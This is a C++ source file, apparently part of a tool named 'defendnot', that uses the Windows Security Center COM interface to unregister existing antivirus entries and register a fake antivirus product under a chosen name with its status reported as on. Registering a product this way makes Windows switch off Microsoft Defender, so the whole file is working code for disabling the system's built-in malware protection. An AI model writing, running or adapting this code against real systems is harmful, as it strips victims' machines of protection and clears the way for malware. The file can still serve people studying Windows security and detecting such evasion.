#include "bootstrap.hpp"
#include "core/com.hpp"
#include "core/log.hpp"
#include "shared/ctx.hpp"
#include "shared/defer.hpp"

#include <Windows.h>

namespace defendnot {
    void startup() {
        /// Setup
        shared::ctx.deserialize();
        logln("init: {:#x}", com::checked(CoInitialize(nullptr)));

        /// Get the main WSC interface we will be dealing with
        auto inst = com::query<IWscAVStatus4>();

        /// This can fail if we dont have any avs registered so no com_checked
        logln("unregister: {:#x}", com::retry_while_pending([&inst]() -> HRESULT { return inst->Unregister(); }) & 0xFFFFFFFF);
        if (shared::ctx.state == shared::State::OFF) {
            return;
        }

        /// WSC will reject the register request if name is empty
        auto name_w = std::wstring(shared::ctx.name.begin(), shared::ctx.name.end());
        if (name_w.empty()) {
            throw std::runtime_error("AV Name can not be empty!");
        }

        /// Convert to BSTR
        auto name = SysAllocString(name_w.c_str());
        defer->void {
            SysFreeString(name);
        };

        /// Register and activate our AV
        logln("register: {:#x}", com::checked(inst->Register(name, name, 0, 0)));
        logln("update: {:#x}", com::checked(inst->UpdateStatus(WSCSecurityProductState::ON, WSCSecurityProductState::ON)));
        logln("scan_update: {:#x}", com::checked(inst->UpdateScanSubstatus(WSCSecurityProductSubStatus::NO_ACTION)));
        logln("settings_update: {:#x}", com::checked(inst->UpdateSettingsSubstatus(WSCSecurityProductSubStatus::NO_ACTION)));
        logln("prot_update: {:#x}", com::checked(inst->UpdateProtectionUpdateSubstatus(WSCSecurityProductSubStatus::NO_ACTION)));
    }
} // namespace defendnot
